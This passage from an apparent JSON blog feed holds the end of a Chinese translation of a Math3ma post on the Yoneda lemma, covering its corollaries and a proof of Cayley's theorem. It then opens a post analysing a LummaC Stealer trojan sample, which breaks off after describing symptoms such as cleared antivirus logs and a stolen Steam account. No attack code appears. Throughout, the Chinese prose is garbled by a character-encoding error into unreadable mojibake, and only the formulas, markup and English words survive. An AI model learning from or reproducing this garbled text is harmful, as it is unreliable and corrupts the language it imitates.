¸â€æ•ˆæœçš„ä½“ç°ï¼šè™½ç„¶å•ä½æ€å°„æ˜¯æˆ‘ä»¬å”¯ä¸€å·²çŸ¥ä¸€å®šå­˜åœ¨çš„æ€å°„ï¼Œä½†å…¶ä»–æ‰€æœ‰æ€å°„çš„å»å‘éƒ½è¢«è¿™ä¸ªå•ä½æ€å°„çš„å»å‘å›ºå®šäº†ï¼‰ã€‚</p>\n<p>æˆ‘ä»¬è¿˜æ˜¯è¦æ£€æŸ¥è¿™äº›æŒ‡æ´¾(assignment)ï¼ˆè¯‘è€…æ³¨ï¼šåº”è¯¥æŒ‡çš„æ˜¯ä¸Šé¢ä¸¤ç§å¯¹å¶çš„è¯´æ³•ï¼‰æ˜¯å¦çœŸçš„å½¼æ­¤äº’ä¸ºé€†ï¼ˆä»¥åŠ $\\eta$ æ˜¯å¦çœŸçš„æ˜¯ä¸€ä¸ªè‡ªç„¶å˜æ¢ï¼‰ã€‚ä½†æ­£å¦‚Tom Leinster<a href=\"https://arxiv.org/abs/1612.09375\">æ›¾ç»è¯´è¿‡</a>çš„ï¼Œâ€œç†è§£äº†é—®é¢˜å°±ç­‰äºå¿«çŸ¥é“ç­”æ¡ˆäº†â€¦â€¦åªæœ‰ä¸€ç§å‘å‰è¿›çš„åŠæ³•ã€‚â€</p>\n<p>Yonedaå¼•ç†çš„ä¸€ä¸ªç›´æ¥æ¨è®ºæ˜¯<a href=\"#2\">ä¸Šå‘¨è®¨è®ºçš„å†…å®¹</a>ï¼Œè¿™é‡Œå†æ¬¡å¼ºè°ƒï¼š</p>\n<h3 id=\"Yonedaå¼•ç†ç¬¬ä¸€æ¨è®ºï¼ˆè¦ç‚¹ï¼ƒ1ï¼‰\"><a href=\"#Yonedaå¼•ç†ç¬¬ä¸€æ¨è®ºï¼ˆè¦ç‚¹ï¼ƒ1ï¼‰\" class=\"headerlink\" title=\"Yonedaå¼•ç†ç¬¬ä¸€æ¨è®ºï¼ˆè¦ç‚¹ï¼ƒ1ï¼‰\"></a>Yonedaå¼•ç†ç¬¬ä¸€æ¨è®ºï¼ˆè¦ç‚¹ï¼ƒ1ï¼‰</h3><blockquote>\n<p><strong>æ¨è®º1ï¼š</strong> YonedaåµŒå…¥ $\\mathscr{Y} : \\mathbf{C} \\rightarrow \\mathbf{Set}^{\\mathbf{C} }$ æ˜¯å…¨å¿ å®çš„ã€‚</p>\n</blockquote>\n<p>æ˜ å°„ $\\text{hom}(X,Y) \\mapsto \\text{Nat}(\\text{hom}(-,X), \\text{hom}(-,Y))$ çš„å•å°„æ€§æ˜¯æ˜¾è€Œæ˜“è§çš„ï¼ˆå¦‚æœ $f \\neq g$ï¼Œåˆ™ $f_* \\neq g_*$ï¼‰ã€‚Yonedaå¼•ç†åˆ™ç»™å‡ºæ»¡å°„æ€§ã€‚ä¸ºäº†è¯æ˜è¿™ä¸€ç‚¹ï¼Œå°† $F &#x3D; \\text{hom}(-,Y)$ ä»£å…¥å¼•ç†çš„é™ˆè¿°ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªåŒå°„<br>$$ \\mathbf{Nat}(\\text{hom}(-,X), \\text{hom}(-,Y)) \\cong \\text{hom}(X,Y) $$<br>ç°åœ¨è®¾ $\\eta : \\text{hom}(-,X) \\rightarrow \\text{hom}(-,Y)$ æ˜¯ä»»æ„çš„è‡ªç„¶å˜æ¢ã€‚æˆ‘ä»¬éœ€è¦è¯æ˜å­˜åœ¨ä¸€ä¸ªæ€å°„ $f : X \\rightarrow Y$ ä½¿å¾— $\\eta &#x3D; f_*$. è¿™é‡Œçš„â€ $\\eta &#x3D; f_*$ â€œ æ„å‘³ç€å¯¹äºèŒƒç•´ $\\mathbf{C}$ ä¸­çš„æ¯ä¸ªå¯¹è±¡ $W$ å’Œä»»ä½•æ˜ å°„ $g : W \\rightarrow X$ï¼Œéƒ½æœ‰<br>$$\\eta_W(g) &#x3D; f \\circ g$$<br>é‚£ä¹ˆæ˜ å°„ $f$ åº”è¯¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå®é™…ä¸Šåªæœ‰ä¸€ç§é€‰æ‹©ï¼æ ¹æ®Yonedaå¼•ç†ï¼Œ$\\eta$ æ°å¥½å®Œå…¨å–å†³äºä¸€ä¸ªæ€å°„ $\\eta_X(\\text{id}_X) : X \\rightarrow Y$. æ‰€ä»¥æˆ‘ä»¬å°±é€‰è¿™ä¸ªï¼ä¹Ÿå°±æ˜¯è¯´ï¼Œ<br>$$\\text{ä»¤} f :&#x3D; \\eta_X(\\text{id}_X)$$<br>ç°åœ¨æˆ‘ä»¬åªéœ€è¦éªŒè¯è¿™æ ·æ˜¯å¦å¯è¡Œã€‚ä½†æ ¹æ®å®šä¹‰ï¼Œè¿™æ ·çš„é™ˆè¿°â€œ$\\eta$ æ˜¯ä¸€ä¸ªè‡ªç„¶å˜æ¢â€æ„å‘³ç€å¯¹äºèŒƒç•´ $\\mathbf{C}$ ä¸­çš„ä»»æ„ä¸€å¯¹å¯¹è±¡ $Z$ã€$W$ å’Œä»»ä½•æ˜ å°„ $g : W \\rightarrow Z$ï¼Œæˆ‘ä»¬æœ‰ç­‰å¼ $\\eta_W \\circ g^* &#x3D; g^* \\circ \\eta_Z$ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºä»»ä½• $h : Z \\rightarrow X$ï¼Œéƒ½æœ‰<br>$$\\eta_W(h \\circ g) &#x3D; \\eta_Z(h) \\circ g$$</p>\n<p><img src=\"/yoneda/natural.jpg\" loading=\"lazy\"></p>\n<p>ç”±äºè¿™å¯¹äº<em>æ‰€æœ‰</em> $Z$ å’Œ $h$ éƒ½æˆç«‹ï¼Œæ‰€ä»¥å¯¹äºç‰¹ä¾‹ï¼š $Z&#x3D;X$ ä¸” $h&#x3D;\\text{id}_X \\in \\text{hom}(X,X)$ ä»ç„¶æˆç«‹ã€‚<br>ç°åœ¨ï¼Œè‡ªç„¶æ€§æ¡ä»¶ç»™å‡ºçš„æ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼šå¯¹äºæ‰€æœ‰ $g : W \\rightarrow X$ï¼Œéƒ½æœ‰ $\\eta_W(g) &#x3D; fg$. å› æ­¤ $\\eta &#x3D; f_*$. </p>\n<p>å› æ­¤ï¼Œä¸€ä¸ªå¯¹è±¡ $X$ æœ¬è´¨ä¸Š(effectually)ä¸å…¶å¯è¡¨ç¤ºå‡½å­ç­‰æ•ˆã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬æ€»æ˜¯ä¸“æ³¨äºåå˜å‡½å­ $\\text{hom}(-,X)$ï¼Œä½†å…¶å®å­˜åœ¨YonedaåµŒå…¥çš„åå˜ç‰ˆæœ¬ï¼ˆä»¥åŠå¯¹åº”äº<em>åå˜</em>å‡½å­ç‰ˆæœ¬ $F$ çš„Yonedaå¼•ç†ç‰ˆæœ¬ï¼‰ï¼ˆè¯‘è€…æ³¨ï¼šå³åºç« éƒ¨åˆ†æ‰€è¿°co-YonedaåµŒå…¥ä¸co-Yonedaå¼•ç†ï¼‰ï¼Œå› æ­¤æœ‰ä¸€ä¸ªç±»ä¼¼çš„â€œæ¨è®º1â€ï¼Œå…¶ä¸­ $\\text{hom}(-,X)$ è¢«æ›¿æ¢ä¸º $\\text{hom}(X,-)$. ä½†æœ¬è´¨æ˜¯ç›¸åŒçš„â€”â€”$X$ æ˜¯ç”±å…¶ä¸å…¶ä»–å¯¹è±¡çš„å…³ç³»å†³å®šçš„ã€‚</p>\n<p>æ›´å¥½çš„æ˜¯ï¼Œå®ƒæ˜¯<em>å®Œå…¨åœ°</em>ç”±å…¶ä¸å…¶ä»–å¯¹è±¡çš„å…³ç³»å†³å®šçš„ã€‚è¿™ä¸ªâ€œå®Œå…¨â€ä¸€è¯æ˜¯ç”±æåˆ°è¿‡çš„è¦ç‚¹äºŒç»™å‡ºçš„ï¼Œå®é™…ä¸Šå®ƒå°±æ˜¯Yonedaå¼•ç†çš„ç¬¬äºŒæ¨è®ºã€‚</p>\n<h3 id=\"Yonedaå¼•ç†ç¬¬äºŒæ¨è®ºï¼ˆè¦ç‚¹ï¼ƒ2ï¼‰\"><a href=\"#Yonedaå¼•ç†ç¬¬äºŒæ¨è®ºï¼ˆè¦ç‚¹ï¼ƒ2ï¼‰\" class=\"headerlink\" title=\"Yonedaå¼•ç†ç¬¬äºŒæ¨è®ºï¼ˆè¦ç‚¹ï¼ƒ2ï¼‰\"></a>Yonedaå¼•ç†ç¬¬äºŒæ¨è®ºï¼ˆè¦ç‚¹ï¼ƒ2ï¼‰</h3><blockquote>\n<p>æ¨è®º2ï¼š$X \\cong Y \\Leftrightarrow \\text{hom}(-,X) \\cong \\text{hom}(-,Y)$. </p>\n</blockquote>\n<p>åœ¨ä¸€ä¸ªæ–¹å‘ï¼ˆè¯‘è€…æ³¨ï¼š$\\Rightarrow$ï¼‰ä¸Šå®ƒæ˜¾ç„¶æˆç«‹ï¼Œå› ä¸º $Y$ æ˜¯ä¸€ä¸ªå‡½å­ï¼šå¦‚æœ $X$ å’Œ $Y$ æ˜¯åŒæ„çš„ï¼Œé‚£ä¹ˆ $\\text{hom}(-,X)$ å’Œ $\\text{hom}(-,Y)$ ä¹Ÿæ˜¯åŒæ„çš„ï¼›è€Œå¦ä¸€ä¸ªæ–¹å‘ä¸Šï¼ˆè¯‘è€…æ³¨ï¼š$\\Leftarrow$ï¼‰ä¹Ÿæˆç«‹åˆ™æ˜¯å› ä¸º $Y$ æ˜¯å…¨å¿ å®çš„ã€‚æœ‰ä¸ªä¸€èˆ¬æ€§çš„äº‹å®ï¼šå¦‚æœ $F : \\mathbf{C} \\rightarrow \\mathbf{D}$ æ˜¯ä¸€ä¸ªå…¨å¿ å®çš„å‡½å­ï¼Œå¹¶ä¸”å¦‚æœ $F(X) \\cong F(Y)$ï¼Œé‚£ä¹ˆ $X \\cong Y$. ï¼ˆè¯æ˜è§æœ¬éƒ¨åˆ†è„šæ³¨ã€‚*ï¼‰</p>\n<p>æˆ‘ä»¬ä¸Šå‘¨çœ‹åˆ°äº†è¿™ä¸ªæ¨è®ºçš„ä¸€ä¸ªä¾‹å­ï¼šä¸¤ä¸ªæ‹“æ‰‘ç©ºé—´ $X$ å’Œ $Y$ æœ‰ç›¸åŒçš„åŠ¿å½“ä¸”ä»…å½“ $\\text{hom}(\\bullet, X) \\cong \\text{hom}(\\bullet, Y)$ï¼›å®ƒä»¬æœ‰ç›¸åŒçš„è·¯å¾„ç©ºé—´å½“ä¸”ä»…å½“ $\\text{hom}(I, X) \\cong \\text{hom}(I, Y)$ï¼›å®ƒä»¬æœ‰ç›¸åŒçš„ç¯ç©ºé—´å½“ä¸”ä»…å½“ $\\text{hom}(S^1, X) \\cong \\text{hom}(S^1, Y)$ï¼›ç­‰ç­‰ã€‚ç”¨å„ç§ç©ºé—´æ¢æµ‹ $X$ å’Œ $Y$ ä¼šç»™å‡ºæ›´å¤šä¿¡æ¯ã€‚ç”¨<em>æ‰€æœ‰</em>ç©ºé—´æ¥æ¢æµ‹åˆ™å¯ä»¥ç»™å‡º<em>æ‰€æœ‰</em>ä¿¡æ¯ã€‚</p>\n<p><img src=\"/yoneda/probe2.jpg\" loading=\"lazy\"></p>\n<p>å½“ç„¶ï¼Œè§‚å¯Ÿä» $X$ <em>å‡ºå‘</em>çš„æ˜ å°„åŒæ ·èƒ½æä¾›æœ‰æ•ˆä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œ$X$ æ˜¯<a href=\"http://www.math3ma.com/mathema/2015/9/7/on-connectedness-intuitively\">è¿é€šçš„</a>å½“ä¸”ä»…å½“æ¯ä¸ªæ˜ å°„ $X \\rightarrow {0,1}$ éƒ½æ˜¯å¸¸å€¼æ˜ å°„ã€‚æœ‰è¶£çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è€ƒè™‘ç”±Sierpinskiæ‹“æ‰‘èµ‹äºˆçš„ç›¸åŒé›†åˆ ${0,1}$ï¼Œé‚£ä¹ˆï¼ˆ<a href=\"http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property\">æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æ‰€è§</a>ï¼‰é›†åˆ $\\text{hom}(X, {0,1})$ å°†å¾—ä»¥æ•è· $X$ ä¸Šçš„å…¨éƒ¨æ‹“æ‰‘ã€‚æ­¤å¤–ï¼Œä» $X$ åˆ°<a href=\"https://en.wikipedia.org/wiki/Eilenberg%E2%80%93MacLane_space\">Eilenberg-MacLane</a>ç©ºé—´çš„æ˜ å°„åœ¨åŒä¼¦çš„æ„ä¹‰ä¸‹(up to homotopy)å–å†³äº $X$ çš„åŒè°ƒç¾¤ã€‚å¦ä¸€æ–¹é¢ï¼Œä» nç»´çƒé¢ åˆ° $X$ çš„æ˜ å°„çš„åŒä¼¦ç±»å¡‘é€ äº† $X$ çš„åŒä¼¦ç¾¤ã€‚</p>\n<p>å¦‚æ­¤ç€é‡å¼ºè°ƒæ€å°„æ˜¯Yonedaè§†è§’ï¼ˆæˆ–è€…è¯´æ˜¯Yonedaå¼•ç†ï¼‰çš„ç»“æœï¼›<em>ä¸€åˆ‡çš„å…³é”®åœ¨äºå…³ç³»ï¼</em></p>\n<p><img src=\"/yoneda/summary.jpg\" loading=\"lazy\"></p>\n<p>æˆ‘æƒ³å†ç”¨ä¸€ä¸ªä¾‹å­æ”¶å°¾æœ¬æ–‡ã€‚Yonedaå¼•ç†æœ‰æ—¶è¢«æè¿°ä¸ºç¾¤è®ºä¸­<a href=\"https://en.wikipedia.org/wiki/Cayley%27s_theorem\">Cayleyå®šç†</a>çš„æ¨å¹¿ã€‚ç¡®å®æ˜¯è¿™æ ·çš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Yonedaå¼•ç†æ¥<em>è¯æ˜</em>Cayleyå®šç†ã€‚</p>\n<hr>\n<h3 id=\"ä¸€ä¸ªå¯¹Cayleyå®šç†çš„è¯æ˜\"><a href=\"#ä¸€ä¸ªå¯¹Cayleyå®šç†çš„è¯æ˜\" class=\"headerlink\" title=\"ä¸€ä¸ªå¯¹Cayleyå®šç†çš„è¯æ˜\"></a>ä¸€ä¸ªå¯¹Cayleyå®šç†çš„è¯æ˜</h3><p>ä»»æ„ç¾¤ $G$ éƒ½å¯ä»¥è¢«è§†ä¸ºä¸€ä¸ªèŒƒç•´ï¼Œè®°ä½œ $\\mathbf{BG}$ï¼Œå…¶ä¸­æœ‰å”¯ä¸€å¯¹è±¡ $\\bullet$ï¼Œæ¯ä¸ªç¾¤å…ƒç´ å¯¹åº”ä¸€ä¸ªæ€å°„ã€‚ä» $\\mathbf{BG}^{op}$ åˆ° $\\mathbf{Set}$ çš„å‡½å­ $F$ è¢«ç§°ä¸ºå³$G$-é›†åˆã€‚å®ƒå°† $\\bullet$ å‘é€åˆ°ä¸€ä¸ªé›†åˆ $X$ï¼Œå°†ä¸€ä¸ªæ€å°„ï¼ˆå³ç¾¤å…ƒç´ ï¼‰ $g$ å‘é€åˆ°å³ä¹˜ä»¥ $g$ çš„å‡½æ•° $X \\rightarrow X$. ç‰¹åˆ«åœ°ï¼Œå½“ $F &#x3D; \\text{hom}(-,\\bullet)$ æ—¶ï¼Œé›†åˆ $\\text{hom}(\\bullet,\\bullet)$ å°±æ˜¯ $G$ ï¼Œå…¶è‡ªèº«ä¹Ÿè¢«è§†ä¸ºå³$G$-é›†åˆã€‚ç„¶åæ ¹æ®Yonedaå¼•ç†ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåŒå°„ï¼š</p>\n<p><img src=\"/yoneda/cayley1.jpg\" loading=\"lazy\"></p>\n<p>å³è¾¹ç®€å•æ¥è¯´å°±æ˜¯ç¾¤ $G$ ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ä½†å·¦è¾¹å‘¢ï¼Ÿé¦–å…ˆæ³¨æ„åˆ°è‡ªç„¶å˜æ¢ $\\text{hom}(-,\\bullet) \\rightarrow \\text{hom}(-,\\bullet)$ å°±åªæ˜¯ $G$-ç­‰å˜å‡½æ•° $G \\rightarrow G$. </p>\n<p>ä½†å®ƒä»¬æ˜¯å“ªäº› $G$-ç­‰å˜å‡½æ•°å‘¢ï¼Ÿæ ¹æ®æ¨è®º1ä¸­çš„åŒå°„ï¼Œå®ƒä»¬æ˜¯ç”± $G$ ä¸­çš„å…ƒç´ æ„é€ è€Œæˆçš„ã€‚ç®€è€Œè¨€ä¹‹ï¼Œé›†åˆ $\\mathbf{Nat}(\\text{hom}(\\bullet,\\bullet), \\text{hom}(\\bullet,\\bullet))$ å°±æ˜¯ç”±æ‰€æœ‰å‡½æ•° $f_g : G \\rightarrow G$ æ„æˆçš„ï¼Œå…¶å®šä¹‰ä¸º $x \\mapsto xg$. è€Œè¿™äº›<em>æ°å¥½</em>æ˜¯ç”±ä¸€ä¸ªå›ºå®šå…ƒç´ çš„ä¹˜æ³•å¾—åˆ°çš„ $G$ çš„è‡ªåŒæ€ï¼</p>\n<p><img src=\"/yoneda/cayley2.jpg\" loading=\"lazy\"></p>\n<p>å› æ­¤å·¦è¾¹å®é™…ä¸Šæ˜¯æ‰€æœ‰ $G$ ä¸Šçš„ç½®æ¢çš„ä¸€ä¸ªå­ç¾¤ã€‚è€Œä¸”ï¼Œæ ¹æ®Yonedaå¼•ç†ï¼Œè¿™ä¸ªå­ç¾¤åŒæ„äºç¾¤ $G$ æœ¬èº«ã€‚è¿™å°±æ˜¯Cayleyå®šç†ã€‚ï¼ˆç¼–è¾‘äº2022å¹´12æœˆï¼šä¸Šé¢çš„å›¾è¡¨æœ‰äº›è¯¯å¯¼ã€‚è¯·å‚é˜…<a href=\"https://math.stackexchange.com/questions/4598810/yoneda-lemma-cayley-s-theorem-and-example-with-cyclic-group-mathbbz-6\">è¿™ä¸ªStackExchangeå¸–å­</a>ã€‚ï¼‰</p>\n<p>ï¼ˆè¯‘è€…æ³¨ï¼šç®€è€Œè¨€ä¹‹ï¼Œåœ¨ä¸Šæ–‡æ„é€ çš„èŒƒç•´ä¸­ï¼Œæ ¹æ®Yonedaå¼•ç†ç¬¬ä¸€æ¨è®ºï¼Œ$\\text{hom}(-,\\bullet) \\rightarrow \\text{hom}(-,\\bullet) \\cong \\text{hom}(\\bullet,\\bullet)$. $\\text{hom}(-,\\bullet) \\rightarrow \\text{hom}(-,\\bullet)$ ç”±æ€å°„ $\\text{hom}(\\bullet,\\bullet) \\rightarrow \\text{hom}(\\bullet,\\bullet)$ å†³å®šï¼Œè€Œ $\\text{hom}(\\bullet,\\bullet) \\cong G$ï¼Œå› æ­¤è¯¥æ€å°„ä¹Ÿå³Gåˆ°è‡ªèº«çš„ä¸€ä¸ªç½®æ¢ã€‚æ•…è¯¥è‡ªç„¶å˜æ¢èŒƒç•´åŒæ„äºGä¸Šçš„ç½®æ¢ç¾¤çš„ä¸€ä¸ªå­ç¾¤ï¼Œè€Œç”±äº $\\text{hom}(\\bullet,\\bullet) \\cong G$, ç¬¬ä¸€æ¨è®ºå°†ç»™å‡ºå…¶åŒæ„äºG.ï¼‰</p>\n<hr>\n<h3 id=\"å»¶ä¼¸é˜…è¯»\"><a href=\"#å»¶ä¼¸é˜…è¯»\" class=\"headerlink\" title=\"å»¶ä¼¸é˜…è¯»\"></a>å»¶ä¼¸é˜…è¯»</h3><p>è‹¥æƒ³æ·±å…¥äº†è§£Yonedaå¼•ç†ï¼Œæˆ‘å¼ºçƒˆæ¨èTom Leinsterçš„<a href=\"https://www.amazon.com/Category-Cambridge-Studies-Advanced-Mathematics/dp/1107044243\"><em>Basic Category Theory</em></a>ä»¥åŠä»–é˜é‡Šå¾—éå¸¸æ¸…æ™°çš„<a href=\"http://www.maths.ed.ac.uk/~tl/categories/yoneda.ps\"><em>The Yoneda Lemma: Whatâ€™s it All About?</em></a>ã€‚æˆ‘è¿˜æ¨èEmily Riehlçš„<a href=\"http://www.math.jhu.edu/~eriehl/context.pdf\"><em>Category Theory in Context</em></a>ï¼ˆå¥¹çš„ä¾‹å­ç‰¹åˆ«ä¸°å¯Œï¼‰ï¼Œä»¥åŠå¯¹äºä¸€äº›çœŸæ­£æ·±å¥¥çš„æ•°å­¦ï¼Œå¯ä»¥å‚è€ƒ<a href=\"https://ncatlab.org/nlab/show/Yoneda+lemma\">nLab</a>ã€‚åœ¨è¿™äº›é“¾æ¥ä¸­ï¼Œä½ ä¼šæ³¨æ„åˆ°Yonedaå¼•ç†è¿˜æœ‰ç¬¬ä¸‰ä¸ªç»å…¸çš„æ¨è®ºï¼Œè€Œæˆ‘ä»¬åœ¨æœ¬ç³»åˆ—ä¸­å¹¶æœªæ¶µç›–ã€‚ä¹Ÿè®¸æœªæ¥çš„æ–‡ç« ä¸­ä¼šæœ‰ï¼</p>\n<p>å¦‚æœä½ å–œæ¬¢â€œç”¨å…¶ä»–å¯¹è±¡æ¢æµ‹å¯¹è±¡â€çš„æƒ³æ³•ï¼Œä½ ä¼šå¾ˆé«˜å…´çŸ¥é“è¿™æ˜¯<em>å¹¿ä¹‰ç‚¹å“²å­¦</em>çš„ä¸€éƒ¨åˆ†ã€‚æƒ³äº†è§£æ›´å¤šå¯ä»¥å‚è€ƒLeinsterçš„<a href=\"http://www.maths.ed.ac.uk/~tl/elements.pdf\"><em>Doing Without Diagrams</em></a>å’ŒWilliam Lawvereçš„<a href=\"http://www.tac.mta.ca/tac/reprints/articles/11/tr11.pdf\"><em>An Elementary Theory of the Category of Sets</em></a>ï¼ˆ2005å¹´ç‰ˆæœ¬ï¼‰ã€‚</p>\n<p>æœ€åï¼Œè¿˜æœ‰ä¸€ä¸ªå¾ˆå¹²ç»ƒçµæ€§çš„ç»“æœå«åšå¯†åº¦å®šç†ï¼ˆä¾‹å¦‚<a href=\"http://www.math.jhu.edu/~eriehl/context.pdf\">è¿™é‡Œ</a>çš„å®šç†6.5.8ï¼‰ï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬æ¯ä¸ªä» $\\mathbf{C}^{op}$ åˆ° $\\mathbf{Set}$ çš„å‡½å­ $F$ å®é™…ä¸Šéƒ½æ˜¯ç”±è¢«è¡¨ç¤ºçš„å‡½å­ $\\text{hom}(-,X)$ <em>æ„å»º</em>è€Œæˆçš„ã€‚ä¸¥è°¨åœ°è¯´ï¼Œæ¯ä¸ªè¿™æ ·çš„ $F$ éƒ½æ˜¯æŸäº› $\\text{hom}(-,X)$ çš„<a href=\"https://en.wikipedia.org/wiki/Limit_(category_theory)\">ä½™æé™</a>ã€‚è¿™ç¡®å®æ˜¯ä¸€ä¸ªæƒŠè‰³çš„æˆæœï¼ˆèƒŒåæœ‰ç²¾å½©çš„æ•°å­¦ï¼æ¯”å¦‚Kanæ‰©å±•ï¼‰ï¼Œä½†æˆ‘ä¼šæ¨è¿Ÿç›¸å…³çš„è®¨è®ºâ€”â€”æˆ‘ä»¬è¿˜æ²¡æœ‰è®¨è®ºè¿‡<a href=\"http://www.math3ma.com/mathema/2018/1/2/limits-and-colimits-part-1\">ä½™æé™æˆ–æé™</a>ï¼è‡³å°‘ç›®å‰ä¸ºæ­¢ã€‚</p>\n<hr>\n<p>*è¯æ˜ï¼šè®¾ $h : F(X) \\rightarrow F(Y)$ æ˜¯å…·æœ‰é€† $h^{-1}$ çš„åŒæ„ã€‚ç”±äº $F$ æ˜¯å…¨å¿ å®çš„ï¼Œå­˜åœ¨å”¯ä¸€çš„æ€å°„ $f : X \\rightarrow Y$ ä½¿å¾— $Ff &#x3D; h$ ã€‚ç±»ä¼¼åœ°ï¼Œå­˜åœ¨å”¯ä¸€çš„æ€å°„ $g : Y \\rightarrow X$ ä½¿å¾— $Fg &#x3D; h^{-1}$ ã€‚å› æ­¤ï¼Œ<br>$$ \\text{id}_{F(X)} &#x3D; h^{-1} \\circ h &#x3D; Fg \\circ Ff &#x3D; F(fg). $$<br>ä½† $F(\\text{id}_X)$ æ˜ å°„åˆ° $ \\text{id}_{F(X)} $ ï¼Œå› æ­¤ç”±äº $F$ æ˜¯å¿ å®çš„ï¼Œæœ‰ $fg &#x3D; \\text{id}_X$ ã€‚ç±»ä¼¼çš„è®ºè¯å¯è¯æ˜ $gf &#x3D; \\text{id}_Y$ ã€‚å› æ­¤ï¼Œ $f$ æ˜¯ä¸€ä¸ªåŒæ„ã€‚</p>\n<h2 id=\"è¯‘åè®°\"><a href=\"#è¯‘åè®°\" class=\"headerlink\" title=\"è¯‘åè®° \"></a>è¯‘åè®° <a name=\"postlude\"></a></h2><p>è¯‘è€…çš„çŸ¥è¯†æ°´å¹³éå¸¸æœ‰é™ï¼Œéš¾å…æœ‰ä¸€äº›é”™è¯¯ï¼Œå¸Œæœ›è¯»è€…è§è°…ï¼Œä¹Ÿæ¬¢è¿æ–§æ­£ã€‚æ¯”å¦‚åœ¨åºè¨€éƒ¨åˆ†å¯¹å¼•ç†çš„è§£è¯»æ˜¯å¦æœ‰å¤±åé¢‡ä¹ƒè‡³å­˜åœ¨è¯¯å¯¼ï¼Ÿ<br>æ­¤å¤–ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ­£ç»ç¿»è¯‘æ–‡ç« ï¼Œæ‰€ä»¥ä¹ŸæœŸç›¼åœ¨ç»“æ„ã€å¥å¼ã€æœ¯è¯­ä¸Šçš„ç¿»è¯‘å»ºè®®<code>:)</code><br>ä¾‹å¦‚ï¼Œæœ¬æ–‡å°†â€vantage pointâ€ç¿»è¯‘ä¸ºâ€œè§†ç‚¹â€ï¼Œå°†â€cooked up fromâ€ç¿»è¯‘ä¸ºâ€œç”±â€¦â€¦æ„é€ è€Œæ¥â€ï¼Œâ€gives rise toâ€ç¿»è¯‘ä¸ºâ€œå–å†³äºâ€ï¼Œä¸çŸ¥æ˜¯å¦æœ‰æ›´ä¼˜çš„é€‰æ‹©ã€‚<br>æ¬¢è¿äº¤æµæ¢è®¨^_^</p>\n<h2 id=\"è¯‘è€…æ¨èé˜…è¯»\"><a href=\"#è¯‘è€…æ¨èé˜…è¯»\" class=\"headerlink\" title=\"è¯‘è€…æ¨èé˜…è¯»\"></a>è¯‘è€…æ¨èé˜…è¯»</h2><p>å¦‚æœä½ å–œæ¬¢å¯è§†åŒ–æˆ–åç›´è§‰çš„é˜é‡Šï¼Œè¯·åŠ¡å¿…è¯»ä¸€è¯»ï¼š<br><a href=\"https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/trackback/\">Category Theory for Programmers: The Preface (by Bartosz Milewski)</a> ï¼ˆæœ¬æ–‡å¯¹åº”ç« èŠ‚ï¼š<a href=\"https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/\">The Yoneda Lemma</a>ï¼‰<br>åæ•°å­¦æ–¹å‘çš„æ¨èï¼š<br><a href=\"https://www.wwli.asia/downloads/books/Al-jabr-1.pdf\">ä»£æ•°å­¦æ–¹æ³•ï¼šç¬¬ä¸€å·ï¼ˆææ–‡å¨ è‘—ï¼‰</a><br>åè®¡ç®—æœºæ–¹å‘çš„æ¨èï¼š<br><a href=\"https://people.mpi-sws.org/~dreyer/courses/catlogic/jacobs.pdf\">Categorical Logic and Type Theory (by B. Jacobs)</a></p>\n",
            "tags": [
                "Math",
                "Translation",
                "Yoneda Lemma"
            ]
        },
        {
            "id": "http://cubicy.icu/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/",
            "url": "http://cubicy.icu/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/",
            "title": "å¯¹æœ¨é©¬LummaC Stealeræ ·æœ¬æç®€çš„ä¸€æ¬¡åˆ†æ",
            "date_published": "2023-11-22T09:47:43.000Z",
            "content_html": "<p>æœ¬æ–‡å¸¦ä½ é€šè¿‡å…¬å¼€çš„ç½‘ç«™åˆ†ææ•è·çš„æ¶æ„ç¨‹åºã€‚</p>\n<h2 id=\"èµ·å› \"><a href=\"#èµ·å› \" class=\"headerlink\" title=\"èµ·å› \"></a>èµ·å› </h2><p>ç”µè„‘è¢«äººå€Ÿç”¨æ—¶ï¼Œä¸‹ç›—ç‰ˆè½¯ä»¶ä¸‹åˆ°ä¸€ä¸ªä¸€çœ‹å°±æ˜¯ä¸‹å´½å™¨çš„ä¸œè¥¿ï¼Œä½†æ˜¯ä¼°è®¡ä»–æ²¡å¤šæƒ³ï¼Œæˆ‘ä¹Ÿæ²¡å¤šæƒ³ã€‚2023-10-15</p>\n<h2 id=\"é“ºå«\"><a href=\"#é“ºå«\" class=\"headerlink\" title=\"é“ºå«\"></a>é“ºå«</h2><p>ç«ç»’æ—¥å¿—è¢«æ¸…ç©º</p>\n<p>è°·æ­ŒæŠ¥æ¶æ„è½¯ä»¶æ´»åŠ¨ å¼ºåˆ¶é€€å‡º</p>\n<p>GitHubè¢«æ ‡è®°ä¸ºspam</p>\n<p>æ•°å­—ç­¾åçš„ä¸€äº›é©±åŠ¨è¢«ç¯¡æ”¹</p>\n<h2 id=\"é«˜æ½®\"><a href=\"#é«˜æ½®\" class=\"headerlink\" title=\"é«˜æ½®\"></a>é«˜æ½®</h2><p>Steamè¢«ç›— 